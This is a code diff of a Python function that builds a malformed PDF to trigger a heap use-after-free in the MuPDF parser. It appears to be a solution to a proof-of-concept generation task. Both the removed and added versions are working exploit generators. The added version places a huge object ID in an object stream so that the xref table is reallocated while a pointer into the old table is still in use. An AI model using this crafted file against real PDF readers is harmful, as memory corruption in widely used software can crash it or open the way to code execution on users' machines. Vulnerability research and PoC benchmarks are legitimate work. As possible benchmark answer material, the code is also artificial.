@@ -2,77 +2,94 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        # Construct a PDF that triggers a Heap Use After Free in MuPDF.
-        # The strategy is to have an object stream (ObjStm) that claims to contain
-        # an object with a very high ID (e.g., 1000), while the declared /Size of the
-        # xref table is small (5).
-        # Accessing an object inside this ObjStm will cause the parser to process the
-        # ObjStm header. Encountering object 1000 triggers an xref table resize.
-        # If the calling function (pdf_cache_object) holds a pointer to the old xref entry
-        # of the object being loaded, this pointer becomes invalid (UAF).
+        """
+        Generate a PoC that triggers the Heap Use After Free vulnerability.
         
-        header = b"%PDF-1.7\n"
-        binary_marker = b"%\x80\x81\x82\x83\n"
+        The vulnerability occurs when pdf_load_obj_stm is called to load an object 
+        from an object stream. If the object stream's index references an object ID 
+        that is outside the current xref table bounds, the table is resized (realloc), 
+        invalidating any existing pointers to xref entries held on the stack by callers 
+        (like pdf_cache_object).
         
-        # Object 1: Catalog
-        # References Object 3 as the Pages dictionary.
-        obj1_content = b"<< /Type /Catalog /Pages 3 0 R >>"
-        obj1 = b"1 0 obj\n" + obj1_content + b"\nendobj\n"
+        We construct a PDF with:
+        1. An XRef Stream (Obj 6) defining a small table size (7).
+        2. Object 2 is defined as compressed in Object Stream 1.
+        3. Object Stream 1 contains an index entry for a very large object ID (100000).
+        4. Accessing Object 2 triggers loading of Stream 1, which processes the index,
+           encounters 100000, resizes the xref table, and frees the old table.
+        5. The caller (loading Object 2) still holds a pointer to the old table entry.
+        """
         
-        # Object 2: Object Stream (ObjStm)
-        # Defines two objects: 3 and 1000.
-        # Object 3 is valid and needed.
-        # Object 1000 is the trigger for the vulnerability (xref resize).
-        # Header format: "obj_num offset" pairs.
-        # "3 0" -> Obj 3 at offset 0.
-        # "1000 0" -> Obj 1000 at offset 0 (sharing content with Obj 3).
-        # We pad the header to 16 bytes so /First can be 16.
-        stm_header = b"3 0 1000 0      " 
+        header = b"%PDF-1.7\n%\x80\x80\x80\x80\n"
         
-        # Content at offset 0: A valid Pages dictionary.
-        inner_obj = b"<< /Type /Pages /Count 0 /Kids [] >>"
+        # Object 1: Object Stream
+        # It contains object 2 and object 100000.
+        # Object 2 is needed by the catalog.
+        # Object 100000 triggers the resize of the xref table.
+        # Index format: "oid off oid off ..."
+        # Index: 2 at offset 0, 100000 at offset 10.
+        idx_data = b"2 0 100000 10 "
+        first_offset = len(idx_data)
         
-        stm_full = stm_header + inner_obj
+        # Object 2 content: "()" (empty string)
+        obj2_content = b"()"
+        # Padding to reach offset 10
+        # Current length from first_offset is len(obj2_content) = 2.
+        # Need 8 bytes padding.
+        padding = b" " * (10 - len(obj2_content))
+        # Object 100000 content: "()"
+        obj_huge_content = b"()"
         
-        # /N 2 means 2 objects in stream. /First 16 is offset to data.
-        obj2_dict = (
-            b"<< /Type /ObjStm /N 2 /First 16 /Length " + 
-            str(len(stm_full)).encode() + b" >>"
-        )
-        obj2 = b"2 0 obj\n" + obj2_dict + b"\nstream\n" + stm_full + b"\nendstream\nendobj\n"
+        stm_data = idx_data + obj2_content + padding + obj_huge_content
         
-        # Calculate offsets
-        offset_1 = len(header) + len(binary_marker)
-        offset_2 = offset_1 + len(obj1)
-        offset_4 = offset_2 + len(obj2)
+        # Obj 1 construction
+        o1_dict = f"<</Type /ObjStm /N 2 /First {first_offset} /Length {len(stm_data)}>>"
+        o1 = f"1 0 obj\n{o1_dict}\nstream\n".encode('latin1') + stm_data + b"\nendstream\nendobj\n"
         
-        # Object 4: XRef Stream
-        # Serves as the cross-reference table.
-        # /Size 5 covers objects 0-4.
-        # Object 1000 is NOT covered by /Size, forcing a resize when encountered.
-        # W [1 2 1] -> Fields are 1, 2, 1 bytes.
+        # Object 3: Catalog
+        # OpenAction 2 0 R triggers loading of Object 2 immediately.
+        o3 = b"3 0 obj\n<</Type /Catalog /Pages 4 0 R /OpenAction 2 0 R>>\nendobj\n"
         
-        # Entry 0: Free
-        e0 = b'\x00\x00\x00\x00'
-        # Entry 1: Offset of Obj 1 (Type 1)
-        e1 = b'\x01' + struct.pack('>H', offset_1) + b'\x00'
-        # Entry 2: Offset of Obj 2 (Type 1)
-        e2 = b'\x01' + struct.pack('>H', offset_2) + b'\x00'
-        # Entry 3: Compressed in ObjStm 2, Index 0 (Type 2)
-        # This causes the parser to load ObjStm 2 when Obj 3 is requested.
-        e3 = b'\x02\x00\x02\x00'
-        # Entry 4: Offset of Obj 4 (Type 1)
-        e4 = b'\x01' + struct.pack('>H', offset_4) + b'\x00'
+        # Object 4: Pages
+        o4 = b"4 0 obj\n<</Type /Pages /Kids [5 0 R] /Count 1>>\nendobj\n"
         
-        xref_stm = e0 + e1 + e2 + e3 + e4
+        # Object 5: Page
+        o5 = b"5 0 obj\n<</Type /Page /Parent 4 0 R /MediaBox [0 0 612 792]>>\nendobj\n"
         
-        obj4_dict = (
-            b"<< /Type /XRef /Size 5 /W [1 2 1] /Root 1 0 R /Length " + 
-            str(len(xref_stm)).encode() + b" >>"
-        )
-        obj4 = b"4 0 obj\n" + obj4_dict + b"\nstream\n" + xref_stm + b"\nendstream\nendobj\n"
+        # Calculate offsets for XRef Stream
+        offset = len(header)
+        off1 = offset
+        offset += len(o1)
         
-        # Trailer points to start of XRef stream (Object 4)
-        startxref = b"startxref\n" + str(offset_4).encode() + b"\n%%EOF"
+        off3 = offset
+        offset += len(o3)
         
-        return header + binary_marker + obj1 + obj2 + obj4 + startxref
+        off4 = offset
+        offset += len(o4)
+        
+        off5 = offset
+        offset += len(o5)
+        
+        off6 = offset # XRef Stream Object
+        
+        # XRef Stream Data
+        # W [1 4 2]
+        # Entries 0 to 6
+        def entry(t, f2, f3):
+            return struct.pack('>B I H', t, f2, f3)
+            
+        xdata = b""
+        xdata += entry(0, 0, 65535)      # 0: Free
+        xdata += entry(1, off1, 0)       # 1: Obj 1 (offset off1)
+        xdata += entry(2, 1, 0)          # 2: Obj 2 (Compressed in stream 1 idx 0)
+        xdata += entry(1, off3, 0)       # 3: Obj 3
+        xdata += entry(1, off4, 0)       # 4: Obj 4
+        xdata += entry(1, off5, 0)       # 5: Obj 5
+        xdata += entry(1, off6, 0)       # 6: Obj 6 (Self)
+        
+        o6_dict = f"<</Type /XRef /Size 7 /Root 3 0 R /W [1 4 2] /Length {len(xdata)}>>"
+        o6 = f"6 0 obj\n{o6_dict}\nstream\n".encode('latin1') + xdata + b"\nendstream\nendobj\n"
+        
+        trailer = f"startxref\n{off6}\n%%EOF\n".encode('latin1')
+        
+        return header + o1 + o3 + o4 + o5 + o6 + trailer
